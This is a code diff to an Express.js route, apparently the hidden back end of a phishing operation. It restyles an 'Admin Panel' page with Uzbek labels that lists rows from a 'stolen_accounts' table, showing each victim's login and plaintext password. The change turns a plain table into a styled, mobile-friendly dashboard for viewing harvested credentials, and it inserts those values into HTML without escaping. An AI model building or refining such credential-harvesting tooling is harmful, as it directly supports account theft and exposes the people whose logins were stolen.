@@ -53,12 +53,62 @@ app.get("/view-data-secret", async (req, res) => {
       "SELECT * FROM stolen_accounts ORDER BY created_at DESC",
     );
 
-    let html =
-      "<h1>Yig'ilgan ma'lumotlar</h1><table border='1'><tr><th>ID</th><th>Login</th><th>Parol</th><th>Vaqt</th></tr>";
+    let html = `
+    <!DOCTYPE html>
+    <html lang="uz">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Admin Panel | Ma'lumotlar</title>
+        <style>
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; color: #333; }
+            .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+            h1 { color: #2c3e50; text-align: center; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+            table { width: 100%; border-collapse: collapse; margin-top: 20px; overflow: hidden; border-radius: 8px; }
+            th { background-color: #3498db; color: white; padding: 12px; text-align: left; }
+            td { padding: 12px; border-bottom: 1px solid #eee; }
+            tr:hover { background-color: #f1f1f1; transition: 0.3s; }
+            .status { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; background: #e8f5e9; color: #2e7d32; }
+            .time { color: #7f8c8d; font-size: 13px; }
+            @media (max-width: 600px) { 
+                table { font-size: 14px; } 
+                .container { padding: 10px; }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>📊 Yig'ilgan ma'lumotlar boshqaruvi</h1>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Login (Username)</th>
+                        <th>Parol (Password)</th>
+                        <th>Tushgan vaqti</th>
+                    </tr>
+                </thead>
+                <tbody>`;
+
     result.rows.forEach((row) => {
-      html += `<tr><td>${row.id}</td><td>${row.login}</td><td>${row.password}</td><td>${row.created_at}</td></tr>`;
+      // Vaqtni chiroyli ko'rinishga keltirish
+      const date = new Date(row.created_at).toLocaleString("uz-UZ");
+
+      html += `
+                <tr>
+                    <td><strong>#${row.id}</strong></td>
+                    <td><span class="status">${row.login}</span></td>
+                    <td><code>${row.password}</code></td>
+                    <td class="time">${date}</td>
+                </tr>`;
     });
-    html += "</table>";
+
+    html += `
+                </tbody>
+            </table>
+        </div>
+    </body>
+    </html>`;
 
     res.send(html);
   } catch (err) {
